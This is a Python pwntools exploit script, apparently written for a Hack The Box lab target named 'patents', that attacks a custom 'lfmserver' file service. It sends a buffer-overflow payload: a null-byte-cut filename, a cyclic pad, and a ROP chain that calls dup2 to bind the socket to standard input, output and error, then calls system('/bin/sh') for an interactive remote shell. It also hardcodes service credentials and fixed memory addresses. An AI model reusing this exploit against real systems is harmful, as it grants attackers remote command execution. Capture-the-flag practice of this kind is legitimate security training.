#!/usr/bin/env python
import sys
import os
from utils import md5,recvline
import socket
from pwn import *
import urllib

libc = ELF("./libc-2.28.so")

dup2 = 0x7f931bc216c0
libc_base = 0x7f931bb17000
pop_rdi = 0x405c4b
pop_rsi_and_r15 = 0x405c49
system = libc_base + libc.symbols["system"]
bin_sh = libc_base + 0x1aae80
nop = 0x40251f

HOST = sys.argv[1]
var = HOST.split(":")
try:
    PORT = int(var[1])
except ValueError:
    print("Port number must be integer")
    exit(-1)
HOST = var[0]
r = remote(HOST, PORT)

def getRequest(filename_payload):
    INPUTREQ = "CHECK {} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n"
    print("Connecting to " + HOST + ":" + str(PORT))
    USER = 'lfmserver_user'
    PASS = '!gby0l0r0ck$$!'

    try:
        #md5sum = md5('/home/zoey/htb/patents/lfm/files/try')
        md5sum = 'nope'
    except IOError:
        print("File not found locally")
        exit(-1)

    return INPUTREQ.format(filename_payload, USER, PASS, md5sum)

payload = "/convert.php%00"
payload += cyclic(140).decode("utf-8")
payload += urllib.parse.quote(p64(0xAAAABBBB)) # $rbp value after ret

payload += urllib.parse.quote(p64(pop_rdi))
payload += urllib.parse.quote(p64(0x6))
payload += urllib.parse.quote(p64(pop_rsi_and_r15))
payload += urllib.parse.quote(p64(0x0))
payload += urllib.parse.quote(p64(0xdeadbeef)) #ignored
payload += urllib.parse.quote(p64(dup2))

payload += urllib.parse.quote(p64(pop_rdi))
payload += urllib.parse.quote(p64(0x6))
payload += urllib.parse.quote(p64(pop_rsi_and_r15))
payload += urllib.parse.quote(p64(0x1))
payload += urllib.parse.quote(p64(0xdeadbeef)) #ignored
payload += urllib.parse.quote(p64(dup2))

payload += urllib.parse.quote(p64(pop_rdi))
payload += urllib.parse.quote(p64(0x6))
payload += urllib.parse.quote(p64(pop_rsi_and_r15))
payload += urllib.parse.quote(p64(0x2))
payload += urllib.parse.quote(p64(0xdeadbeef)) #ignored
payload += urllib.parse.quote(p64(dup2))

payload += urllib.parse.quote(p64(nop))

payload += urllib.parse.quote(p64(pop_rdi))
payload += urllib.parse.quote(p64(bin_sh))
payload += urllib.parse.quote(p64(system))

theRequest = getRequest(payload)

r.send(theRequest)
r.interactive()